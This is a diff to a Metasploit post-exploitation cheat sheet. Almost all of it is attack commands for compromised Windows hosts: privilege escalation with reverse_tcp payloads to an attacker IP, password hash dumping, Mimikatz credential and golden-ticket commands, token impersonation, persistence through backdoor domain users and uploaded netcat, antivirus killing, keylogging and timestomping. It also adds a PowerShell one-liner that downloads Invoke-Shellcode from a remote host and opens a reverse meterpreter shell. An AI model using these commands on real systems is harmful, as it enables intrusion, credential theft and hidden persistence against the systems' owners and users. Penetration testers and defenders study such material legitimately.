@@ -31,13 +31,13 @@ msf > db_status                               Check that you are connected to th
 
 # Troubleshooting
 
-# If the db connection fails:
+- If the db connection fails:
 msf > exit
 msfdb init
 msfconsole
 msf > db_status
 
-# If the db connection still fails:
+- If the db connection still fails:
 msf > exit
 
 cat /usr/share/metasploit-framework/config/database.yml
@@ -60,7 +60,7 @@ msfdb init
 msfconsole
 msf > db_status
 
-# Module database cache not built yet, using slow search
+- Module database cache not built yet, using slow search
 db_rebuild_cache                              Rebuilds the database-stored module cache
 ------------------------------------------------------------------------------------------------------
 
@@ -127,26 +127,25 @@ Active session manipulation and interaction.
 
 OPTIONS:
 
-    -K        Terminate all sessions
-    -c <opt>  Run a command on the session given with -i, or all
-    -h        Help banner
-    -i <opt>  Interact with the supplied session ID   
-    -k <opt>  Terminate sessions by session ID and/or range
-    -l        List all active sessions
-    -q        Quiet mode
-    -r        Reset the ring buffer for the session given with -i, or all
-    -s <opt>  Run a script on the session given with -i, or all
-    -t <opt>  Set a response timeout (default: 15)
-    -u <opt>  Upgrade a shell to a meterpreter session on many platforms
-    -v        List sessions in verbose mode
-    -x        Show extended information in the session table
-
+     -K        Terminate all sessions
+     -c <opt>  Run a command on the session given with -i, or all
+     -h        Help banner
+     -i <opt>  Interact with the supplied session ID
+     -k <opt>  Terminate sessions by session ID and/or range
+     -l        List all active sessions
+     -q        Quiet mode
+     -r        Reset the ring buffer for the session given with -i, or all
+     -s <opt>  Run a script on the session given with -i, or all
+     -t <opt>  Set a response timeout (default: 15)
+     -u <opt>  Upgrade a shell to a meterpreter session on many platforms
+     -v        List sessions in verbose mode
+     -x        Show extended information in the session table
 
 Many options allow specifying session ranges using commas and dashes.
 
 For example:
-   sessions -s checkvm -i 1,3-5
-   sessions -k 1-2,5,6
+     sessions -s checkvm -i 1,3-5
+     sessions -k 1-2,5,6
 
 sessions -l                                   Show active sessions
 sessions -i 2                                 Interact with session 2
@@ -160,21 +159,6 @@ migrate <PID>                                 Migrate to a process running as NT
 sysinfo                                       Gets information about the remote system, such as OS
 getuid                                        Get the user that the server is running as
 ipconfig                                      Show the target IP
-
-run get_local_subnets                         Get the local subnets
-run post/windows/gather/hashdump
-run post/windows/gather/credentials/credential_collector
-
-run killav
-run getcountermeasure
-run winenum
-run post/windows/gather/checkvm
-run post/windows/gather/enum_applications
-run post/windows/gather/enum_logged_on_users
-run post/windows/gather/enum_shares
-run post/windows/gather/enum_snmp
-run post/windows/gather/usb_history
-reg enumkey -k HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
 ------------------------------------------------------------------------------------------------------
 
 # Escalate privileges
@@ -182,10 +166,10 @@ reg enumkey -k HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\
 use priv                                      Attempt to elevate to NT AUTHORITY\SYSTEM
 background                                    If this fails, background the current session and try options
 
---Option 1:
+- Option 1:
 getsystem
 
---Option 2:
+- Option 2:
 use exploit/windows/local/bypassuac
 set SESSION 1
 set PAYLOAD windows/meterpreter/reverse_tcp
@@ -193,13 +177,13 @@ set LHOST <attacker IP>
 set LPORT 444                                 This MUST be a different port from what was used in the original exploit
 exploit
 
---Option 3:
+- Option 3:
 run post/windows/escalate/getsystem
 getuid
 getsystem
 getuid                                        Privileges should now be NT AUTHORITY\SYSTEM
 
---Option 4:
+- Option 4:
 use post/windows/escalate/droplnk
 set SESSION 1
 set PAYLOAD windows/meterpreter/reverse_tcp
@@ -207,7 +191,7 @@ set LHOST <attacker IP>
 set LPORT 444
 exploit
 
---Option 5:
+- Option 5:
 use exploit/windows/local/service_permissions
 set SESSION 1
 set PAYLOAD windows/meterpreter/reverse_tcp
@@ -215,7 +199,7 @@ set LHOST <attacker IP>
 set LPORT 444
 exploit
 
---Option 6:
+- Option 6:
 use exploit/windows/local/trusted_service_path
 set SESSION 1
 set PAYLOAD windows/meterpreter/reverse_tcp
@@ -223,7 +207,7 @@ set LHOST <attacker IP>
 set LPORT 444
 exploit
 
---Option 7:
+- Option 7:
 use exploit/windows/local/ppr_flatten_rec
 set SESSION 1
 set PAYLOAD windows/meterpreter/reverse_tcp
@@ -231,7 +215,7 @@ set LHOST <attacker IP>
 set LPORT 444
 exploit
 
---Option 8:
+- Option 8:
 use exploit/windows/local/ms_ndproxy
 set SESSION 1
 set PAYLOAD windows/meterpreter/reverse_tcp
@@ -239,7 +223,7 @@ set LHOST <attacker IP>
 set LPORT 444
 exploit
 
---Option 9:
+- Option 9:
 use exploit/windows/local/ask
 set SESSION 1
 set PAYLOAD windows/meterpreter/reverse_tcp
@@ -250,33 +234,47 @@ exploit
 
 # Dump hashes
 
-hashdump                                      Try to dump password hashes. If this fails continue
+hashdump                                      Try to dump password hashes, if this fails continue
 ps                                            Show running processes
-migrate <pid>                                 Migrate to a process running as NT AUTHORITY\SYSTEM
+migrate <PID>                                 Migrate to a process running as NT AUTHORITY\SYSTEM
 hashdump                                      Dump password hashes
 
 run post/windows/gather/credentials/credential_collector
 run post/windows/gather/credentials/domain_hashdump
+run post/windows/gather/credentials/gpp
 ------------------------------------------------------------------------------------------------------
 
-# View passwords
+# Mimikatz
 
-load kiwi                                     Mimikatz
-lsa_dump                                      Show the current user password in plain text
-creds_all                                     Show all user passwords in plain text
-wifi_list                                     Show all wireless networks that have been connected and passwords
+load kiwi                                     Load Mimikatz
+creds_all                                     Retrieve all credentials
+creds_kerberos                                Retrieve Kerberos creds
+creds_livessp                                 Retrieve LiveSSP creds
+creds_msv                                     Retrieve LM/NTLM creds (hashes)
+creds_ssp                                     Retrieve SSP creds
+creds_tspkg                                   Retrieve TsPkg creds
+creds_wdigest                                 Retrieve WDigest creds
+golden_ticket_create                          Create a golden kerberos ticket
+kerberos_ticket_list                          List all kerberos tickets
+kerberos_ticket_purge                         Purge any in-use kerberos tickets
+kerberos_ticket_use                           Use a kerberos ticket
+lsa_dump                                      Dump LSA secrets
+wifi_list                                     List wifi profiles/creds
 ------------------------------------------------------------------------------------------------------
 
 # Steal tokens to impersonate
 
+getuid
+getprivs                                      Gets as many SYSTEM privileges as it can
 use incognito
 list_tokens -u
 list_tokens -g
 impersonate_token <domain>\\<user>
+impersonate_token "NT AUTHORITY\\SYSTEM"
 getuid
 ------------------------------------------------------------------------------------------------------
 
-# Establish persistance
+# Establish persistence
 
 Option 1:
 run persistence -h
@@ -286,34 +284,34 @@ Notice that it shows where the file is stored on the Windows machine.
 It also gives you the location of the Meterpreter resource file you can run to remove persistence.
 
 Example:
-msf > use exploit/multi/handler
-msf > set PAYLOAD windows/meterpreter/reverse_tcp
-msf > set LHOST <attacker IP>
-msf > set LPORT 443
-msf > set ExitOnSession false
-msf > set AutoRunScript persistence -X -i 30 -p 443 -r <target IP>
-msf > exploit -j -z
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <attacker IP>
+set LPORT 443
+set ExitOnSession false
+set AutoRunScript persistence -X -i 30 -p 443 -r <target IP>
+exploit -j -z
 
 Option 2 - Add a user:
 add_user <user> <password> -h <target IP>
 add_group_user "Domain Admins" <user> -h <target IP>
 
 Option 3 - Scheduled:
-msf > info exploit/windows/local/s4u_persistence
+info exploit/windows/local/s4u_persistence
 
 Notice the trigger methods: event, lock, logon, schedule, unlock
 
-msf > use exploit/windows/local/s4u_persistence
-msf > set session 1
-msf > set TRIGGER lock
-msf > exploit
+use exploit/windows/local/s4u_persistence
+set session 1
+set TRIGGER lock
+exploit
 
 Option 4 - Volume Shadow Copy:
-msf > use exploit/windows/local/vss_persistence
-msf > set session 1
-msf > set RHOST <target IP>
-msf > set LPORT 4445  <———use a different port number
-msf > exploit
+use exploit/windows/local/vss_persistence
+set session 1
+set RHOST <target IP>
+set LPORT 4445  <———use a different port number
+exploit
 
 Option 5 - Upload netcat:
 meterpreter > upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32\\
@@ -340,6 +338,20 @@ set RHOST <target IP>
 exploit
 ------------------------------------------------------------------------------------------------------
 
+# Windows enumeration
+
+run killav
+run getcountermeasure
+run winenum
+run post/windows/gather/checkvm
+run post/windows/gather/enum_applications
+run post/windows/gather/enum_logged_on_users
+run post/windows/gather/enum_shares
+run post/windows/gather/enum_snmp
+run post/windows/gather/usb_history
+reg enumkey -k HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+------------------------------------------------------------------------------------------------------
+
 # Upload tools
 
 upload <local path> <remote path>
@@ -349,17 +361,20 @@ upload /usr/share/windows-binaries/nc.exe c:\\
 # Lateral movement
 
 use windows/smb/psexec
-set SMBUser <user name>
-set SMBPass <user hash>
 set RHOST <target IP>
+set SMBUser <user>
+set SMBPass <password or hash>
 set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST <attacker IP>
-set LPORT <attacker port>
+set LHOST <local IP>
+set LPORT <local port>
 exploit
+
+powershell -command "IEX (New-Object Net.WebClient).DownloadString('http://AWS-IP/Powersploit/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -lhost <local IP> -lport <local port> -Force"
 ------------------------------------------------------------------------------------------------------
 
 # Pivoting
 
+run get_local_subnets                         Get the local subnets
 ipconfig                                      Look for dual-homed connections
 192.168.0.10
 255.255.255.0
@@ -384,42 +399,42 @@ set THREADS 10
 run
 ------------------------------------------------------------------------------------------------------
 
-Post exploitation of a domain controller (DC)
+# Post exploitation of a domain controller (DC)
 
-# Find all Active Directory users
-msf > use post/windows/gather/enum_ad_computers
-msf post(enum_ad_computers) > set filter objectCategory=computer
-msf post(enum_ad_computers) > set session 1
-msf post(enum_ad_computers) > exploit
+- Find all Active Directory users
+use post/windows/gather/enum_ad_computers
+set filter objectCategory=computer
+set session 1
+exploit
 
-# Enumerate all logged on users
-msf > use post/windows/gather/enum_logged_on_users
-msf post(enum_logged_on_users) > set session 1
-msf post(enum_logged_on_users) > exploit
+- Enumerate all logged on users
+use post/windows/gather/enum_logged_on_users
+set session 1
+exploit
 
-# Gather all Groups in Active Directory
-msf > use post/windows/gather/enum_ad_groups
-msf post(enum_ad_groups) > set session 1
-msf post(enum_ad_groups) > exploit
+- Gather all Groups in Active Directory
+use post/windows/gather/enum_ad_groups
+set session 1
+exploit
 
-# Find all shared folders in Active Directory
-msf > post/windows/gather/enum_shares
-msf post(enum_shares) > set session 1
-msf post(enum_shares) > exploit
+- Find all shared folders in Active Directory
+use post/windows/gather/enum_shares
+set session 1
+exploit
 
-# Add any user in Active Directory
-msf > use post/windows/manage/add_user_domain
-msf post(add_user_domain) > set addtodomain true
-msf post(add_user_domain) > set username hacker
-msf post(add_user_domain) > set password w00t!
-msf post(add_user_domain) > set session 1
-msf post(add_user_domain) > exploit
+- Add any user in Active Directory
+use post/windows/manage/add_user_domain
+set addtodomain true
+set username hacker
+set password w00t!
+set session 1
+exploit
 
-# Delete any  user in Active Directory
-msf > use post/windows/manage/delete_user
-msf post(delete_user) > set username hacker
-msf post(delete_user) > set session 1
-msf post(delete_user) > exploit
+- Delete any  user in Active Directory
+use post/windows/manage/delete_user
+set username hacker
+set session 1
+exploit
 ------------------------------------------------------------------------------------------------------
 
 # msfvenom
@@ -478,13 +493,16 @@ workspace -r <old> <new>      Rename workspace
 # Misc
 
 idletime                      Returns the number of seconds the remote user has been idle
-     if time < 5 min
+     If time < 5 min
      keyscan_start            Start capturing keystrokes
      keyscan_stop             Stop capturing keystrokes
      keyscan_dump             Dump the keystroke buffer
 
 screenshot                    Grab a screenshot of the interactive desktop
 
+timestomp                     Manipulate file MACE attributes
+
 run vnc
-     if the screen is locked exit VNC
-     run screen_unlock
+     If the screen is locked exit VNC
+     Run screen_unlock
+
